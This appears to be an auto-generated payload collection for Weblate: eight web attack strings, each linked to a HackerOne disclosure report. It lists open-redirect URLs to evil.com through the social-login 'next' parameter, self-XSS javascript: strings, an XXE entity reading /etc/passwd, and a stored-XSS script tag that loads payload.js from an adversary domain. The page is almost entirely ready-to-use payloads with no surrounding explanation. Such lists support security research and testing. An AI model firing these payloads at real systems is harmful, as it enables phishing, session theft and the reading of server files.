# Weblate

8 payloads.

### `0656b5c1`

```
https://target.com/accounts/login/github/?next=///evil.com
```

**Parameter:** `next`
— [Open Redirect via "next" parameter in third-party authentication](https://hackerone.com/reports/223326) · Weblate · [ysx](https://hackerone.com/ysx)

### `cab5d6d0`

```
javascript:confirm(document.domain)
```

— [\[target.com\] Stored Self-XSS via Editor Link in Profile](https://hackerone.com/reports/223331) · Weblate · [ysx](https://hackerone.com/ysx)

### `e70e7e61`

```
https://target.com/accounts/login/facebook/?next=///evil.com
```

**Parameter:** `next`
— [Open redirect in Signing in via Social Sites](https://hackerone.com/reports/223718) · Weblate · [rajauzairabdullah](https://hackerone.com/rajauzairabdullah)

### `6b285bed`

```
https://target.com/accounts/login/bitbucket/?next=///evil.com
```

**Parameter:** `next`
— [Open redirect in Signing in via Social Sites](https://hackerone.com/reports/223718) · Weblate · [rajauzairabdullah](https://hackerone.com/rajauzairabdullah)

### `65f995b3`

```
https://target.com/accounts/login/gitlab/?next=///evil.com
```

**Parameter:** `next`
— [Open redirect in Signing in via Social Sites](https://hackerone.com/reports/223718) · Weblate · [rajauzairabdullah](https://hackerone.com/rajauzairabdullah)

### `d6bfe4af`

```
%(branch)s:alert(1);//https://
```

— [Self-XSS can be achieved in the editor link using filter bypass](https://hackerone.com/reports/229735) · Weblate · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `0adde1f8`

```
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
```

— [Uploaded XLF files result in External Entity Execution](https://hackerone.com/reports/232614) · Weblate · [4cad](https://hackerone.com/4cad)

### `7b786962`

```
<script src="http://<adversery_domain>/payload.js"></script>
```

**Parameter:** `project name`
— [Stored XSS @ /engage/<project_slug>](https://hackerone.com/reports/472391) · Weblate · [lgian](https://hackerone.com/lgian)
